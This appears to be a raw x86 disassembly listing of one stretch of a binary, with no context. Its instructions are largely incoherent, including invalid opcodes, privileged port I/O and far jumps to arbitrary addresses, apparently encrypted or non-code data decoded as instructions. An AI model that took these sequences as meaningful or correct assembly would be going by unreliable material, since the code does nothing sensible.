  40585f:	cli    
  405860:	mov    ecx,0xead9f6b9
  405866:	jecxz  0x405836
  405868:	aam    0xf5
  40586a:	cmc    
  40586b:	ffreep st(2)
  40586d:	add    edi,esi
  40586f:	ret    0xc6fe
  405872:	(bad)  
  405873:	(bad)  
  405875:	loopne 0x405875
  405877:	add    al,BYTE PTR [ecx+esi*8]
  40587a:	repz rol bh,0xae
  40587e:	jecxz  0x405833
  405880:	enter  0xd9c0,0xc8
  405884:	mov    edx,0xf803b2ea
  405889:	mov    esp,0xd1d7d2da
  40588e:	test   esi,0xfcc0d4d1
  405894:	fld    st(3)
  405896:	inc    BYTE PTR [edx]
  405898:	retf   
  405899:	shl    DWORD PTR [ecx-0x1e2e363d],1
  40589f:	iret   
  4058a0:	loopne 0x405872
  4058a2:	aad    0xff
  4058a4:	(bad)
  4058a7:	loop   0x405873
  4058a9:	fadd   QWORD PTR [edi]
  4058ab:	in     al,dx
  4058ac:	imul   ah
  4058ae:	test   edi,0xdff707dc
  4058b4:	out    dx,eax
  4058b5:	or     ecx,esp
  4058b7:	jmp    0x4058a0
  4058b9:	jmp    0xb5f1188a
  4058be:	jecxz  0x4058b7
  4058c0:	mov    al,0xc9
  4058c2:	aam    0xfa
  4058c4:	shr    ch,cl
  4058c6:	cmc    
  4058c7:	mov    eax,0x6eec3e1
  4058cc:	icebp  
  4058cd:	mov    esp,0x1b8e4ba
  4058d2:	or     dh,ch
  4058d4:	jmp    0xfd0b20e1
  4058d9:	enter  0xbed3,0xef
  4058dd:	jmp    0xb4df:0xb6fadbb7
  4058e4:	shl    DWORD PTR [ebx-0x1d090b0d],cl
  4058ea:	repz (bad) 
  4058ed:	rcr    esi,cl
  4058ef:	(bad)  
  4058f0:	aam    0xf9
  4058f2:	xlat   BYTE PTR ds:[ebx]
  4058f3:	cmc    
  4058f4:	in     eax,dx
  4058f5:	(bad)  
  4058f7:	ror    eax,0xb9
  4058fa:	out    0xe6,eax
  4058fc:	mov    esi,0xc8adf1d5
  405901:	mov    bh,0xea
  405903:	jmp    0xbcba:0xe8d0cbca
  40590a:	in     al,dx
  40590b:	fmul   st(5),st
  40590d:	(bad)  
  40590e:	xlat   BYTE PTR ds:[ebx]
  40590f:	ret    
  405910:	add    eax,DWORD PTR [edx]
  405912:	retf   0xedf5
  405915:	(bad)  
  405916:	in     al,dx
  405917:	cli    
  405918:	shl    esi,cl
  40591a:	in     eax,dx
  40591b:	out    dx,eax
  40591c:	loope  0x4058de
  40591e:	(bad)  
  40591f:	lock shl BYTE PTR [edi-0x27040e1b],cl
  405926:	mov    ebx,0xedbbcd02
  40592b:	out    dx,eax
  40592c:	out    0xc5,al
  40592e:	or     esp,esi
  405930:	idiv   esi
  405932:	cmc    
  405933:	test   ecx,0x9e305e9
  405939:	shr    BYTE PTR [eax-0x1b384c1a],1
  40593f:	cli    
  405940:	rcl    al,cl
  405942:	mov    ah,0xca
  405944:	xlat   BYTE PTR ds:[ebx]
  405945:	mov    esi,0xf5eae8cb
  40594a:	out    dx,eax
  40594b:	(bad)  
  40594c:	fdivp  st(0),st
  40594e:	loope  0x405915
  405950:	fld    st(3)
  405952:	ret    0xe1f5
  405955:	add    ch,cl
  405957:	loopne 0x405941
  405959:	enter  0xc9af,0xc2
  40595d:	aad    0xf3
  40595f:	loop   0x405923
  405961:	(bad)  
  405962:	(bad)  
  405964:	(bad)  
  405966:	mov    ebx,0xdff1d4fd
  40596b:	pop    es
  40596c:	cld    
  40596d:	cld    
  40596e:	jmp    0x40594d
  405970:	add    al,0xdd
  405972:	std    
  405973:	cmc    
  405974:	(bad)  
  405976:	push   cs
  405977:	loope  0x40595b
  405979:	fsubr  DWORD PTR [edi-0x3b342849]
  40597f:	mov    dl,0xb2
  405981:	mov    ah,0xb1
  405983:	mov    edx,0xd0b8f0b8
  405988:	aam    0xf4
  40598a:	out    0xdf,eax
  40598c:	sti    
  40598d:	fdivr  st(5),st
  40598f:	loop   0x405954
  405991:	xlat   BYTE PTR ds:[ebx]
  405992:	jecxz  0x40595b
  405994:	stc    
  405995:	out    0xce,eax
  405997:	push   es
  405998:	call   0xc9e92690
  40599d:	(bad)  
  40599e:	out    dx,al
  40599f:	rcl    ah,0xd3
  4059a2:	mov    eax,0xdfb7e4c5
  4059a7:	rcr    esp,1
  4059a9:	clc    
  4059aa:	mov    esp,0xebc2d5bc
  4059af:	rcl    dl,cl
  4059b1:	leave  
  4059b2:	add    ebp,edi
  4059b4:	(bad)
  4059b7:	cli    
  4059b8:	in     al,0xde
  4059ba:	mov    al,0xe8
  4059bc:	loope  0x405989
  4059be:	ror    edi,1
  4059c0:	xlat   BYTE PTR ds:[ebx]
  4059c1:	rcr    ecx,1
  4059c3:	rcr    ebp,cl
  4059c5:	clc    
  4059c6:	stc    
  4059c7:	cld    
  4059c8:	out    dx,eax
  4059c9:	ret    
  4059ca:	mov    ebp,0xd2f4fefd
  4059cf:	(bad)  
  4059d0:	fmul   DWORD PTR [edx]
  4059d2:	(bad)  
  4059d3:	std    
  4059d4:	sti    
  4059d5:	fcmovu st,st(0)
  4059d7:	call   0xb10b47ba
  4059dc:	cmc    
  4059dd:	xlat   BYTE PTR ds:[ebx]
  4059de:	mov    dh,0xed
  4059e0:	loope  0x4059b3
  4059e2:	out    dx,al
  4059e3:	clc    
  4059e4:	aad    0xb3
  4059e6:	jmp    0x3bc:0xbefbefbc
  4059ed:	fcmovnb st,st(4)
  4059ef:	fild   WORD PTR [edx]
  4059f1:	(bad)  
  4059f2:	fadd   DWORD PTR [edi]
  4059f4:	out    dx,al
  4059f5:	(bad)  
  4059f6:	repz fxam 
  4059f9:	mov    dl,0xca
  4059fb:	out    0xc6,eax
  4059fd:	vpaddsb xmm1,xmm5,xmm5
  405a01:	mov    dl,0xb0
  405a03:	icebp  
  405a04:	(bad)  
  405a05:	fld    st(4)
  405a07:	clc    
  405a08:	dec    al
  405a0a:	loope  0x4059e4
  405a0c:	fadd   st(6),st
  405a0e:	lock fsub st,st(5)
  405a11:	stc    
  405a12:	jmp    0x4059f1
  405a14:	in     eax,dx
  405a15:	add    edi,ebp
  405a17:	jecxz  0x4059ff
  405a19:	mov    esp,0xe6e9e1c5
  405a1e:	cmc    
  405a1f:	icebp  
  405a20:	loop   0x405a14
  405a22:	mov    ecx,0xf9bdd3b0
  405a27:	xlat   BYTE PTR ds:[ebx]
  405a28:	ret    0xd5fa
  405a2b:	fidivr DWORD PTR [edi-0x1ff40405]
  405a31:	leave  
  405a32:	jmp    0xeffb:0xeffac0c1
  405a39:	mov    dl,0xc8
  405a3b:	call   0xc5044809
  405a40:	mov    cl,0xda
  405a42:	loopne 0x405a31
  405a44:	into   
  405a45:	mov    ah,0xfd
  405a47:	mov    ebp,0x3f0d3b4
  405a4c:	in     eax,0xbf
  405a4e:	aad    0xf7
  405a50:	imul   ebx
  405a52:	jmp    0xeeda:0xfde7c8cf
  405a59:	ret    
  405a5a:	(bad)  
  405a5b:	test   al,0xcc
  405a5d:	mov    cl,0xd5
  405a5f:	icebp  
  405a60:	test   al,0xea
  405a62:	cmc    
  405a63:	fnstenv [esi-0x46340826]
  405a69:	mov    ebx,0xf9d3ffe0
  405a6e:	icebp  
  405a6f:	add    ecx,DWORD PTR [edx]
  405a71:	loopne 0x405a6a
  405a73:	(bad)  
  405a74:	vpaddsw xmm1,xmm6,xmm5
  405a78:	or     ebx,ebp
  405a7a:	int    0xc5
  405a7c:	into   
  405a7d:	lds    esi,FWORD PTR [eax-0x43f0a36]
  405a83:	fdivp  st(1),st
  405a85:	(bad)  [ebp-0x12441c43]
  405a8b:	ror    ebp,cl
  405a8d:	in     al,0xe0
  405a8f:	(bad)  
  405a91:	or     dl,ah
  405a93:	clc    
  405a94:	(bad)  
  405a95:	fisttp WORD PTR [ecx]
  405a97:	in     eax,dx
  405a98:	retf   0xe9e3
  405a9b:	mov    esi,0xeef5e0f7
  405aa0:	test   al,0xe0
  405aa2:	shl    BYTE PTR [ebp-0x2d4a2645],1
  405aa8:	mov    edx,0xc201e8fa
  405aad:	not    al
  405aaf:	loopne 0x405a72
  405ab1:	dec    al
  405ab3:	in     al,0xee
  405ab5:	add    ebx,edi
  405ab7:	dec    edi
  405ab9:	jmp    0xc1cc:0xafc1c8ed
  405ac0:	rol    al,cl
  405ac2:	aam    0xde
  405ac4:	xlat   BYTE PTR ds:[ebx]
  405ac5:	ffreep st(4)
  405ac7:	repnz std 
  405ac9:	ffree  st(1)
  405acb:	std    
  405acc:	into   
  405acd:	in     al,0x0
  405acf:	loope  0x405a92
  405ad1:	clc    
  405ad2:	aad    0xfb
  405ad4:	fadd   DWORD PTR [edx+ecx*8]
  405ad7:	(bad)  
  405ad9:	retf   0xa8d1
  405adc:	repnz out dx,al
  405ade:	out    dx,eax
  405adf:	loopne 0x405ada
  405ae1:	(bad)
  405ae5:	mov    ah,0x3
  405ae7:	in     eax,dx
  405ae8:	cli    
  405ae9:	fidivr DWORD PTR [ebp-0x2f43063e]
  405aef:	add    eax,esp
  405af1:	cmc    
  405af2:	std    
  405af3:	in     eax,0xcf
  405af5:	hlt    
  405af6:	add    ah,al
  405af8:	out    0xa9,al
  405afa:	repnz mov esp,0xdbd2b1be
  405b00:	leave  
  405b01:	call   0xfd0f4ef5
  405b06:	mov    dh,0xcd
  405b08:	out    dx,al
  405b09:	mov    edx,0xf4ddf4f5
  405b0e:	add    bh,ah
  405b10:	or     ebp,edi
  405b12:	or     ecx,DWORD PTR [eax]
  405b14:	cmc    
  405b15:	fucomi st,st(7)
  405b17:	loop   0x405ae4
  405b19:	loopne 0x405aed
  405b1b:	mov    dl,0xcc
  405b1d:	(bad)  
  405b1e:	fdiv   QWORD PTR [ebx-0xa4f0d27]
  405b24:	in     al,dx
  405b25:	shl    cl,1
  405b27:	fnstcw WORD PTR [edi-0x334a4606]
  405b2d:	add    ah,cl
  405b2f:	in     eax,0x6
  405b31:	mov    ecx,0xe709e7e5
  405b37:	or     BYTE PTR [eax],al
  405b39:	fsubp  st(0),st
  405b3b:	loop   0x405afa
  405b3d:	fsubr  QWORD PTR [esi-0x373b062d]
  405b43:	retf   0xeeb6
  405b46:	(bad)  
  405b48:	mov    ecx,0xdcf5ffcf
  405b4d:	int    0xd6
  405b4f:	(bad)  
  405b51:	ret    0xfc0
  405b54:	jmp    0x405b51
  405b56:	or     BYTE PTR [eax],al
  405b58:	int3   
  405b59:	repz out 0xd1,al
  405b5c:	lock iret 
  405b5e:	(bad)  [esi-0x1935450c]
  405b64:	jmp    0xcd2a2d44
  405b69:	rcr    bl,1
  405b6b:	add    eax,esi
  405b6d:	rol    ebp,cl
  405b6f:	or     edi,eax
  405b71:	add    al,0xdf
  405b73:	in     al,0xee
  405b75:	jmp    0xc64e2861
  405b7a:	scas   al,BYTE PTR es:[edi]
  405b7b:	faddp  st(4),st
  405b7d:	fnsave [ebx-0x184b3a2c]
  405b83:	inc    ebp
  405b85:	(bad)  
  405b87:	repnz stc 
  405b89:	jecxz  0x405b88
  405b8b:	(bad)  
  405b8d:	cmc    
  405b8e:	(bad)  
  405b8f:	loope  0x405b81
  405b91:	call   0xef1a475a
  405b96:	out    0xd9,eax
  405b98:	stc    
  405b99:	into   
  405b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b9b:	xlat   BYTE PTR ds:[ebx]
  405b9c:	icebp  
  405b9d:	mov    cl,0xc7
  405b9f:	iret   
  405ba0:	(bad)  
  405ba1:	fcos   
  405ba3:	repnz (bad) 
  405ba5:	in     eax,dx
  405ba6:	xlat   BYTE PTR ds:[ebx]
  405ba7:	leave  
  405ba8:	icebp  
  405ba9:	add    al,BYTE PTR [ebx]
  405bab:	ror    esi,1
  405bad:	add    al,dh
  405baf:	vshufpd xmm7,xmm4,xmm3,0xfe
  405bb4:	mov    esp,0xe313fbc9
  405bb9:	fld    st(6)
  405bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bbc:	in     al,dx
  405bbd:	mov    esp,0xc4ced5d0
  405bc2:	(bad)  
  405bc3:	(bad)  
  405bc4:	(bad)  
  405bc5:	xlat   BYTE PTR ds:[ebx]
  405bc6:	(bad)  
  405bc7:	out    dx,al
  405bc8:	mov    edi,0xd2d8f6d6
  405bcd:	add    eax,0xc6e207f8
  405bd2:	les    ecx,FWORD PTR [ecx]
  405bd4:	add    al,0xc5
  405bd6:	(bad)
  405bda:	(bad)  
  405bdb:	in     eax,0xb2
  405bdd:	(bad)  
  405bde:	hlt    
  405bdf:	(bad)  
  405be0:	(bad)
  405be3:	(bad)  
  405be5:	hlt    
  405be6:	fdivr  st,st(4)
  405be8:	cld    
  405be9:	(bad)  
  405bea:	sar    DWORD PTR [eax-0x1d232440],1
  405bf0:	icebp  
  405bf1:	add    ah,ah
  405bf3:	iret   
  405bf4:	clc    
  405bf5:	push   cs
  405bf6:	call   0xc02c440a
  405bfb:	mov    esi,0xd7d4acbd
  405c00:	mov    ch,0xd8
  405c02:	out    dx,al
  405c03:	mov    eax,0xfdffc8c5
  405c08:	into   
  405c09:	add    eax,ebx
  405c0b:	mov    eax,0xb907f8f3
  405c10:	rol    BYTE PTR [eax],cl
  405c12:	loop   0x405bfa
  405c14:	add    edi,esi
  405c16:	or     ah,ch
  405c18:	or     al,0xe5
  405c1a:	rcl    ebx,cl
  405c1c:	ret    
  405c1d:	int    0xc0
  405c1f:	hlt    
  405c20:	in     eax,0xf1
  405c22:	out    0xed,al
  405c24:	xlat   BYTE PTR ds:[ebx]
  405c25:	jmp    0xd02b1a23
  405c2a:	rcl    dh,0xfa
  405c2d:	sar    ebx,cl
  405c2f:	(bad)  
  405c30:	jecxz  0x405c0c
  405c32:	retf   0xc9f9
  405c35:	in     al,dx
  405c36:	(bad)  
  405c37:	fld    DWORD PTR [ecx]
  405c39:	lods   al,BYTE PTR ds:[esi]
  405c3a:	ret    
  405c3b:	ret    
  405c3c:	shl    BYTE PTR [esi-0x1a1f0e11],cl
  405c42:	lock mov edi,0xd5ddecdb
  405c48:	add    esi,esi
  405c4a:	loopne 0x405c3b
  405c4c:	clc    
  405c4d:	mov    ebp,0x9d00bf0
  405c52:	fadd   QWORD PTR [eax]
  405c54:	fdivp  st(6),st
  405c56:	fldpi  
  405c58:	adc    al,dl
  405c5a:	out    0xc7,al
  405c5c:	in     al,0xb2
  405c5e:	iret   
  405c5f:	out    0xd4,eax
  405c61:	clc    
  405c62:	mov    cl,0xbf
  405c64:	(bad)  
  405c65:	(bad)  
  405c66:	cld    
  405c67:	fdiv   DWORD PTR [eax-0x18200248]
  405c6d:	clc    
  405c6e:	cli    
  405c6f:	aam    0xd2
  405c71:	push   es
  405c72:	push   es
  405c73:	imul   ch
  405c75:	push   cs
  405c76:	int3   
  405c77:	in     al,0xf
  405c79:	out    0xc1,al
  405c7b:	into   
  405c7c:	iret   
  405c7d:	shr    edx,0xcd
  405c80:	in     eax,0xb5
  405c82:	(bad)  
  405c83:	stc    
  405c84:	out    0xb4,al
  405c86:	iret   
  405c87:	jmp    0xfa392d55
  405c8c:	hlt    
  405c8d:	ret    0xd5d2
  405c90:	fild   DWORD PTR [eax]
  405c92:	jmp    0x1348219b
  405c97:	enter  0xddeb,0xce
  405c9b:	jmp    0xcab0:0xd7e4eab2
  405ca2:	shl    bl,1
  405ca4:	mov    bh,0xf1
  405ca6:	add    ebx,esi
  405ca8:	test   BYTE PTR [eax],0xe1
  405cab:	aad    0xd1
  405cad:	(bad)  
  405cae:	lock ror BYTE PTR [edx],0xd0
  405cb2:	or     dh,bl
  405cb4:	out    0xe6,eax
  405cb6:	retf   
  405cb7:	or     edx,edx
  405cb9:	loop   0x405c65
  405cbb:	shr    ecx,1
  405cbd:	enter  0xc8e2,0xbb
  405cc1:	test   ecx,0xddefdaec
  405cc7:	(bad)  
  405cc8:	mov    ebx,0xfac7f403
  405ccd:	add    edi,esi
  405ccf:	fsubr  st,st(3)
  405cd1:	clc    
  405cd2:	or     al,ch
  405cd4:	jmp    0xe7c5:0xf2f8feec
  405cdb:	iret   
  405cdc:	div    BYTE PTR [esi-0x440e3b38]
  405ce2:	(bad)  
  405ce3:	ror    esp,1
  405ce5:	clc    
  405ce6:	mov    esp,0xe2f6f3f5
  405ceb:	hlt    
  405cec:	out    0xfd,eax
  405cee:	rcl    ebx,cl
  405cf0:	std    
  405cf1:	add    cl,bl
  405cf3:	(bad)  
  405cf4:	aam    0xc5
  405cf6:	retf   
  405cf7:	add    al,0xe2
  405cf9:	mov    dl,0xac
  405cfb:	jmp    0x405cc3
  405cfd:	retf   0xf1b0
  405d00:	frstpm(287 only) 
  405d02:	(bad)  
  405d03:	fcmovbe st,st(0)
  405d05:	mov    esi,0xcdbecbdc
  405d0a:	hlt    
  405d0b:	idiv   DWORD PTR [eax+0x1e4faf7]
  405d11:	call   0xe64954d6
  405d16:	add    eax,0xaecceffb
  405d1b:	test   eax,0xedb7f1c6
  405d20:	mov    bh,0xd2
  405d22:	lock stc 
  405d24:	int    0xfc
  405d26:	out    dx,al
  405d27:	out    dx,al
  405d28:	dec    ebp
  405d2a:	xlat   BYTE PTR ds:[ebx]
  405d2b:	fcomp  st(2)
  405d2d:	(bad)  
  405d2f:	(bad)  
  405d30:	jmp    0x405d3a
  405d32:	sti    
  405d33:	call   0xfb1b383c
  405d38:	loop   0x405d17
  405d3a:	ret    0xb1e8
  405d3d:	repz mov bl,0xf2
  405d40:	sti    
  405d41:	mov    ecx,0xe4dab0f6
  405d46:	mov    ecx,0xdccff5cd
  405d4b:	stc    
  405d4c:	fst    st(5)
  405d4e:	(bad)  
  405d4f:	loope  0x405d53
  405d51:	(bad)  
  405d53:	retf   0xf4fa
  405d56:	or     ecx,DWORD PTR [ecx]
  405d58:	pop    es
  405d59:	fsubr  st(4),st
  405d5b:	mov    bl,0xc3
  405d5d:	ret    
  405d5e:	mov    bl,0xfa
  405d60:	neg    eax
  405d62:	hlt    
  405d63:	mov    cl,0xc4
  405d65:	repz add ebx,ebp
  405d68:	cmc    
  405d69:	rcl    esp,0x6
  405d6c:	mov    ebp,0xbcb9d0e7
  405d71:	add    ah,al
  405d73:	or     cl,dl
  405d75:	int    0xd9
  405d77:	in     eax,dx
  405d78:	jmp    0xf7ee:0xb0cecdc4
  405d7f:	idiv   DWORD PTR [ebx-0x3901250c]
  405d85:	fsub   st,st(3)
  405d87:	shl    ebp,1
  405d89:	clc    
  405d8a:	test   ah,0xd6
  405d8d:	fdivr  QWORD PTR [ebx+ecx*1-0x38f7fe1c]
  405d94:	fmul   QWORD PTR [edi]
  405d96:	prefetch (bad)
  405d97:	or     eax,0xc5ded8e4
  405d9c:	loope  0x405d74
  405d9e:	leave  
  405d9f:	jmp    0xe4cc:0xfae0d3f3
  405da6:	int    0xb9
  405da8:	in     eax,dx
  405da9:	fnop   
  405dab:	(bad)  
  405dac:	into   
  405dad:	add    al,0xdb
  405daf:	cli    
  405db0:	jmp    0x405d72
  405db2:	loopne 0x405daa
  405db4:	or     dl,bh
  405db6:	add    esp,ebp
  405db8:	iret   
  405db9:	loopne 0x405d85
  405dbb:	ret    0xcae9
  405dbe:	mov    bl,0xc9
  405dc0:	in     al,dx
  405dc1:	aad    0xd0
  405dc3:	int3   
  405dc4:	(bad)  
  405dc5:	out    dx,eax
  405dc6:	mov    edx,0xbdb9bc
  405dcb:	into   
  405dcc:	neg    ah
  405dce:	test   dh,0x2
  405dd1:	add    dh,bh
  405dd3:	loopne 0x405da3
  405dd5:	(bad)  
  405dd6:	(bad)  
  405dd8:	int    0xf0
  405dda:	(bad)  
  405ddc:	mov    esp,0xe9d3cff5
  405de1:	mov    ecx,0xb5d8f6b6
  405de6:	sti    
  405de7:	(bad)  
  405de9:	mov    bh,0xf3
  405deb:	fcmovne st,st(6)
  405ded:	stc    
  405dee:	rol    DWORD PTR [esp+eax*8],1
  405df1:	jmp    0xeb2654d1
  405df6:	out    0xe2,eax
  405df8:	fld1   
  405dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dfb:	leave  
  405dfc:	mov    bl,0xd1
  405dfe:	mov    cl,0xf4
  405e00:	test   ecx,0xfdc8d6bb
  405e06:	jmp    0xce3b61c0
  405e0b:	out    0xe0,al
  405e0d:	fst    st(5)
  405e0f:	jecxz  0x405e1b
  405e11:	dec    BYTE PTR [eax]
  405e13:	cli    
  405e14:	fadd   QWORD PTR [ebx]
  405e16:	or     ch,bl
  405e18:	add    eax,eax
  405e1a:	out    dx,eax
  405e1b:	jmp    0x405de4
  405e1d:	loope  0x405de2
  405e1f:	retf   
  405e20:	in     eax,dx
  405e21:	retf   0xbbb4
  405e24:	mov    esi,0xcaddfafe
  405e29:	mov    edx,0xfff2fecf
  405e2e:	faddp  st(3),st
  405e30:	fucompp 
  405e32:	cli    
  405e33:	jmp    0xcd0f3cfc
  405e38:	add    eax,0xdde2cbbf
  405e3d:	mov    esp,0xf2d0b5b7
  405e42:	enter  0xb6d0,0xea
  405e46:	rcr    bh,cl
  405e48:	fnop   
  405e4a:	mov    edx,0xe5c3d7fb
  405e4f:	imul   edx
  405e51:	add    ch,cl
  405e53:	std    
  405e54:	(bad)  
  405e55:	std    
  405e56:	fucom  st(6)
  405e58:	in     eax,dx
  405e59:	mov    dl,0xf7
  405e5b:	(bad)  
  405e5c:	jmp    0xf22c2c0d
  405e61:	mov    ebx,0xf7e4f8ba
  405e66:	jmp    0xb73d5449
  405e6b:	div    ebp
  405e6d:	add    cl,bh
  405e6f:	clc    
  405e70:	or     ebx,esi
  405e72:	aad    0xe2
  405e74:	call   ebp
  405e76:	leave  
  405e77:	out    0xd8,al
  405e79:	loopne 0x405e2b
  405e7b:	shl    cl,0xc4
  405e7e:	mov    cl,0xf7
  405e80:	retf   
  405e81:	out    dx,eax
  405e82:	int3   
  405e83:	mov    ch,0xed
  405e85:	mov    edi,0xd9bdf7d0
  405e8a:	out    0xfa,eax
  405e8c:	(bad)  
  405e8d:	mov    esi,0xf7f1d3c5
  405e92:	add    BYTE PTR [edx],al
  405e94:	cmc    
  405e95:	(bad)  
  405e97:	call   0xe5263d80
  405e9c:	shr    BYTE PTR [edi+eax*8-0x14503649],0xfa
  405ea4:	mov    ch,0xca
  405ea6:	in     al,dx
  405ea7:	call   0xdf0d1ea0
  405eac:	fcom   st(1)
  405eae:	cli    
  405eaf:	add    al,0x3
  405eb1:	(bad)
  405eb4:	or     dh,bl
  405eb6:	stc    
  405eb7:	fiadd  WORD PTR [edx+edx*8]
  405eba:	stos   BYTE PTR es:[edi],al
  405ebb:	enter  0xccbd,0xb2
  405ebf:	(bad)  
  405ec0:	repz in al,dx
  405ec2:	mov    ecx,0xc4f4ecf7
  405ec7:	cld    
  405ec8:	repnz enter 0xffc8,0xd5
  405ecd:	fiadd  WORD PTR [eax]
  405ecf:	shl    bh,cl
  405ed1:	jmp    0xdb1657ca
  405ed6:	add    dh,bh
  405ed8:	repz (bad) 
  405eda:	out    dx,eax
  405edb:	scas   eax,DWORD PTR es:[edi]
  405edc:	ror    edi,0xd4
  405edf:	in     al,dx
  405ee0:	(bad)  
  405ee1:	(bad)  
  405ee2:	hlt    
  405ee3:	clc    
  405ee4:	stc    
  405ee5:	leave  
  405ee6:	ror    ebx,1
  405ee8:	in     al,dx
  405ee9:	mov    ebx,0xf1cecefe
  405eee:	jmp    0x405eb4
  405ef0:	or     dh,dh
  405ef2:	(bad)  
  405ef3:	out    dx,eax
  405ef4:	or     BYTE PTR [esp+ebx*8],al
  405ef7:	or     bl,cl
  405ef9:	rcr    al,1
  405efb:	lods   al,BYTE PTR ds:[esi]
  405efc:	loop   0x405edb
  405efe:	in     eax,0xcb
  405f00:	out    0xda,al
  405f02:	mov    ebx,0xe8b7d5ef
  405f07:	lock loope 0x405ec5
  405f0a:	jecxz  0x405edc
  405f0c:	cli    
  405f0d:	in     al,0xbe
  405f0f:	or     edi,esp
  405f11:	(bad)  
  405f12:	pop    es
  405f13:	push   es
  405f14:	(bad)  
  405f15:	clc    
  405f16:	retf   
  405f17:	in     eax,0xdd
  405f19:	stos   BYTE PTR es:[edi],al
  405f1a:	leave  
  405f1b:	mov    al,0xde
  405f1d:	int    0xd4
  405f1f:	in     al,dx
  405f20:	out    dx,al
  405f21:	lock not edx
  405f24:	int3   
  405f25:	enter  0xf6c8,0xed
  405f29:	jmp    0xc13e1516
  405f2e:	fldl2e 
  405f30:	sti    
  405f31:	rcr    ecx,1
  405f33:	(bad)  
  405f35:	ret    
  405f36:	cli    
  405f37:	push   es
  405f38:	out    0xf1,al
  405f3a:	repnz shl esi,cl
  405f3d:	int3   
  405f3e:	jmp    0xdbf3:0xb0f3faf4
  405f45:	fxch   st(6)
  405f47:	int3   
  405f48:	cli    
  405f49:	sar    DWORD PTR [ecx+esi*8-0x1df41a1f],1
  405f50:	stc    
  405f51:	test   ecx,0x5fd0bf7
  405f57:	loop   0x405f33
  405f59:	call   0xc5e9253e
  405f5e:	mov    bl,0xe3
  405f60:	mov    ebx,0xd6f5ceca
  405f65:	in     al,0xeb
  405f67:	ret    
  405f68:	xlat   BYTE PTR ds:[ebx]
  405f69:	cli    
  405f6a:	std    
  405f6b:	stc    
  405f6c:	sar    dh,1
  405f6e:	int3   
  405f6f:	out    0xd2,eax
  405f71:	fcomi  st,st(6)
  405f73:	or     eax,eax
  405f75:	push   cs
  405f76:	std    
  405f77:	std    
  405f78:	loop   0x405f2d
  405f7a:	test   eax,0xb0b7e8c5
  405f7f:	test   eax,0xb9d5f1ea
  405f84:	lock mov esi,0xd2deb1d8
  405f8a:	add    ch,ch
  405f8c:	repnz lds ecx,FWORD PTR [ebx]
  405f8f:	loope  0x405f82
  405f91:	fimul  DWORD PTR [ecx]
  405f93:	leave  
  405f94:	inc    DWORD PTR [eax]
  405f96:	aam    0xc5
  405f98:	pandn  mm1,mm4
  405f9b:	repz icebp 
  405f9d:	loop   0x405f70
  405f9f:	lds    edi,FWORD PTR [edx-0x48043206]
  405fa5:	clc    
  405fa6:	mov    edx,0xfbe0b0d8
  405fab:	loope  0x405f93
  405fad:	cmc    
  405fae:	out    0xb,al
  405fb0:	sti    
  405fb1:	aad    0xc4
  405fb3:	retf   
  405fb4:	(bad)  
  405fb6:	push   es
  405fb7:	add    bh,al
  405fb9:	loopne 0x405f9f
  405fbb:	out    dx,eax
  405fbc:	in     eax,0xc7
  405fbe:	int    0xc9
  405fc0:	shl    BYTE PTR [ebp-0x4702083b],cl
  405fc6:	xlat   BYTE PTR ds:[ebx]
  405fc7:	fnstsw WORD PTR [esi-0x210d2633]
  405fcd:	push   es
  405fce:	(bad)  
  405fd0:	aad    0xeb
  405fd2:	shl    ebp,0xe1
  405fd5:	add    ecx,edi
  405fd7:	fcmovbe st,st(2)
  405fd9:	mov    cl,0xcc
  405fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fdc:	imul   BYTE PTR [ebp-0x64d0d2f]
  405fe2:	jmp    0x405fb4
  405fe4:	mov    esi,0xecfbf8d7
  405fe9:	mov    edi,0x6c107da
  405fee:	icebp  
  405fef:	pop    es
  405ff0:	or     ah,dl
  405ff2:	add    bl,cl
  405ff4:	or     esi,ecx
  405ff6:	jmp    0x405fdf
  405ff8:	leave  
  405ff9:	(bad)  
  405ffa:	into   
  405ffb:	mov    esi,0xebe1d1cb
  406000:	ret    0xfacf
  406003:	in     al,0xe4
  406005:	cld    
  406006:	add    ebx,ebp
  406008:	leave  
  406009:	loop   0x406007
  40600b:	clc    
  40600c:	mov    ah,0x1
  40600e:	loope  0x406013
  406010:	fiadd  WORD PTR [edi]
  406012:	(bad)  
  406013:	hlt    
  406014:	aam    0xcf
  406016:	jmp    0x406000
  406018:	loopne 0x405fe2
  40601a:	out    dx,eax
  40601b:	sar    DWORD PTR [ebp+eax*8-0x2e1b154e],1
  406022:	in     eax,0xb5
  406024:	sar    dh,cl
  406026:	(bad)  
  406028:	enter  0xc8d3,0xd2
  40602c:	int3   
  40602d:	loopne 0x40600d
  40602f:	add    al,BYTE PTR [edi]
  406031:	add    bl,bh
  406033:	loop   0x40603c
  406035:	int    0xc2
  406037:	or     al,0x4
  406039:	ror    ebx,1
  40603b:	rol    edx,1
  40603d:	fdiv   QWORD PTR [ecx-0x334a531e]
  406043:	retf   0xdaf0
  406046:	fsubrp st(3),st
  406048:	mov    edi,0xe2f0f4c2
  40604d:	mov    ebx,0xf5ebbcff
  406052:	call   0xc5474f4c
  406057:	jmp    0xece2:0xf3e0dd0e
  40605e:	loop   0x406010
  406060:	enter  0xffb1,0xd2
  406064:	mov    ebx,0xcaf6eed4
  406069:	loopne 0x40605b
  40606b:	out    0xf1,eax
  40606d:	icebp  
  40606e:	out    0xde,eax
  406070:	in     eax,0xc6
  406072:	(bad)  
  406073:	dec    DWORD PTR [esi]
  406075:	in     eax,0xeb
  406077:	psubw  mm0,mm2
  40607a:	shl    edx,1
  40607c:	jecxz  0x40604e
  40607e:	enter  0xf1ce,0xfb
  406082:	(bad)  
  406083:	in     eax,dx
  406084:	icebp  
  406085:	rcl    ebp,cl
  406087:	cmc    
  406088:	add    ebx,edx
  40608a:	fcmovb st,st(0)
  40608c:	in     al,dx
  40608d:	std    
  40608e:	ret    0xe40b
  406091:	jecxz  0x40608c
  406093:	fcmovnu st,st(3)
  406095:	fisttp QWORD PTR ds:0xa9c3cdc5
  40609b:	mov    bl,0xc0
  40609d:	test   edx,0xcac1ebe9
  4060a3:	test   ebx,0xbefbdedc
  4060a9:	add    esp,ebx
  4060ab:	repnz into 
  4060ad:	loopne 0x4060a5
  4060af:	fcmovb st,st(5)
  4060b1:	or     edi,eax
  4060b3:	add    ecx,edi
  4060b5:	loopne 0x406098
  4060b7:	adc    cl,ah
